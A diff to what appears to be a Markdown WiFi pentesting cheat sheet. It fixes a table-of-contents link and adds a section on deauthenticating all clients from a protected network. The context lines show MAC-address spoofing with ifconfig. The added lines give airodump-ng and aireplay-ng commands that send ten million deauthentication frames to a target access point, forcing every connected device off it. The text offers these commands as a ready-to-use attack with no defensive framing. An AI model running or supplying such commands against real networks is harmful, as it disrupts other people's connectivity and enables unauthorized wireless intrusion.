@@ -5,7 +5,7 @@
 * [Attack/PenTesting](#attackpentesting)
   * [Pre-connection Attacks](#Pre-connection-Attacks)
     * [MAC address changing](#MAC-address-changing)
-    * [Deauthenticating All Clients From Protected WiFi Network](#wps)
+    * [Deauthenticating All Clients From Protected WiFi Network](#Deauthenticating-All-Clients-From-Protected-WiFi Network)
     * [Deauthenticating a Client From Protected WiFi Networks](#others)
   * [Gaining Access](#encryption-attack)
     * [Find SSID of hidden networks](#wepwpawpa2)
@@ -45,4 +45,9 @@
   > ifconfig wlan0 hw ether 00:ff:ff:ff:44:55  
   > ifconfig wlan0 up 
   > ifconfig wlan0 
+  ```
+ ### Deauthenticating All Clients From Protected WiFi Network
+```Bash
+  > airodump-ng -bssid 44:55:tt:ee:ee:bb --channel 11 wlan0
+  > aireplay-ng --deauth 10000000 -a 44:55:tt:ee:ee:bb wlan0  
   ```
